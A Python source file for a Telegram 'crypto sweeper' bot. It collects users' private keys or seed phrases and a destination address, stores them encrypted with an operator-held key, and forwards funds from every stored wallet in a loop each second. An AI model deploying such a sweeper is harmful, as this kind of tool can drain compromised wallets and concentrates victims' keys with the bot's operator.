from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    ConversationHandler, MessageHandler, filters, CallbackQueryHandler
)
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet
import threading
from threading import Lock
from datetime import datetime

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- CONFIG ----------------
app = Flask(__name__)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
TX_LOG_FILE = "transactions.json"   # New: simple transaction log
SECRET_KEY = os.getenv("SECRET_KEY")
PORT = int(os.getenv("PORT", 5000))

if not SECRET_KEY or not TELEGRAM_BOT_TOKEN:
    raise Exception("Missing SECRET_KEY or TELEGRAM_BOT_TOKEN!")

cipher = Fernet(SECRET_KEY.encode())

# ---------------- STORAGE ----------------
data_store = {}      # user wallets
tx_log = []          # recent transactions
data_lock = Lock()

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store, tx_log
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                raw = json.load(f)
                data_store = {int(k): v for k, v in raw.items()}
        except Exception as e:
            logger.error(f"Failed to load wallets: {e}")

    if os.path.exists(TX_LOG_FILE):
        try:
            with open(TX_LOG_FILE, "r") as f:
                tx_log = json.load(f)
        except:
            tx_log = []

def save_data():
    try:
        with data_lock:
            with open(DATA_FILE, "w") as f:
                json.dump(data_store, f, indent=2)
            with open(TX_LOG_FILE, "w") as f:
                json.dump(tx_log[-100:], f, indent=2)  # keep last 100 tx
    except Exception as e:
        logger.error(f"Failed to save: {e}")

def log_transaction(user_id, chain, status, amount=None, tx_hash=None):
    tx = {
        "time": datetime.utcnow().isoformat(),
        "user_id": user_id,
        "chain": chain,
        "status": status,
        "amount": amount,
        "tx_hash": tx_hash
    }
    tx_log.append(tx)
    save_data()

# ---------------- FLASK ----------------
@app.route("/")
def home():
    return "Bot is alive ✅"

# ---------------- STATES ----------------
CHAIN, SECRET, DESTINATION = range(3)

# ---------------- KEYBOARDS ----------------
def main_menu():
    keyboard = [
        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet")],
        [InlineKeyboardButton("📂 My Wallets", callback_data="my_wallets")],
        [InlineKeyboardButton("🗑 Remove Last Wallet", callback_data="remove_wallet")],
        [InlineKeyboardButton("📜 Recent Transactions", callback_data="transactions")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------------- HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **High-Performance Crypto Sweeper**\n\n"
        "Choose an option below:",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "add_wallet":
        return await choose_chain(update, context)
    elif query.data == "my_wallets":
        return await show_wallets(update, context)
    elif query.data == "remove_wallet":
        return await remove_last_wallet(update, context)
    elif query.data == "transactions":
        return await show_transactions(update, context)

# Add Wallet Flow
async def choose_chain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Solana", callback_data="solana")],
        [InlineKeyboardButton("Ethereum", callback_data="ethereum")],
        [InlineKeyboardButton("BSC", callback_data="bsc")]
    ]
    await update.callback_query.edit_message_text("Select Chain:", reply_markup=InlineKeyboardMarkup(keyboard))
    return CHAIN

async def chain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["chain"] = query.data
    await query.edit_message_text(f"✅ Selected: **{query.data.upper()}**\n\nSend your **Private Key** or **Seed Phrase**:")
    return SECRET

async def receive_secret(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["secret"] = update.message.text.strip()
    await update.message.reply_text("Now send the **Destination Wallet Address**:")
    return DESTINATION

async def receive_destination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    destination = update.message.text.strip()
    chain = context.user_data["chain"]
    secret = context.user_data["secret"]
    wallet_type = "seed" if len(secret.split()) > 2 else "private_key"

    user_id = update.effective_user.id
    wallet = {"chain": chain, "type": wallet_type, "secret": encrypt(secret), "destination": destination}

    with data_lock:
        data_store.setdefault(user_id, []).append(wallet)
        save_data()

    await update.message.reply_text(
        f"✅ **Wallet Added Successfully!**\n"
        f"Chain: {chain.upper()}\nType: {wallet_type}\nDestination: `{destination}`",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )
    context.user_data.clear()
    return ConversationHandler.END

# View Wallets
async def show_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    with data_lock:
        wallets = data_store.get(user_id, [])

    if not wallets:
        await query.edit_message_text("No wallets found.", reply_markup=main_menu())
        return

    msg = "📂 **Your Wallets**\n\n"
    for i, w in enumerate(wallets):
        msg += f"{i+1}. **{w['chain'].upper()}** → `{w['destination']}` ({w['type']})\n"
    
    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=main_menu())

# Remove Wallet
async def remove_last_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    with data_lock:
        if user_id in data_store and data_store[user_id]:
            removed = data_store[user_id].pop()
            if not data_store[user_id]:
                del data_store[user_id]
            save_data()
            await query.edit_message_text(f"🗑 Removed: **{removed['chain'].upper()}** wallet", 
                                        parse_mode="Markdown", reply_markup=main_menu())
        else:
            await query.edit_message_text("No wallets to remove.", reply_markup=main_menu())

# Transactions
async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    user_txs = [tx for tx in tx_log[-20:] if tx["user_id"] == user_id]  # last 20 for this user
    
    if not user_txs:
        await query.edit_message_text("No transactions yet.", reply_markup=main_menu())
        return

    msg = "📜 **Recent Transactions**\n\n"
    for tx in reversed(user_txs):
        msg += f"• {tx['time'][:19]} | **{tx['chain'].upper()}** | {tx['status']}\n"
        if tx.get("tx_hash"):
            msg += f"   Hash: `{tx['tx_hash'][:20]}...`\n"
    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=main_menu())

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu())
    context.user_data.clear()
    return ConversationHandler.END

# ---------------- SWEEPER ----------------
MAX_CONCURRENT = 10

async def process_wallet(user_id, wallet, semaphore):
    async with semaphore:
        try:
            secret = decrypt(wallet["secret"])
            chain_func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
            
            # Call forward function (modify your chain functions to return amount + tx_hash if possible)
            result = await asyncio.to_thread(chain_func, secret, wallet["destination"], user_id)
            
            # Log success (adjust according to your forward function return value)
            log_transaction(user_id, wallet["chain"], "Success")
            
        except Exception as e:
            logger.error(f"Error processing wallet {user_id}: {e}")
            log_transaction(user_id, wallet["chain"], f"Error: {str(e)[:50]}")

async def sweeper_loop():
    logger.info("🚀 Sweeper loop started")
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    while True:
        tasks = []
        with data_lock:
            current = list(data_store.items())
        for user_id, wallets in current:
            for wallet in wallets:
                tasks.append(process_wallet(user_id, wallet, semaphore))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(1)

# ---------------- MAIN ----------------
async def main():
    load_data()
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler)],
        states={
            CHAIN: [CallbackQueryHandler(chain_selected)],
            SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
            DESTINATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)

    asyncio.create_task(sweeper_loop())

    logger.info("🤖 Telegram bot starting...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    flask_thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    asyncio.run(main())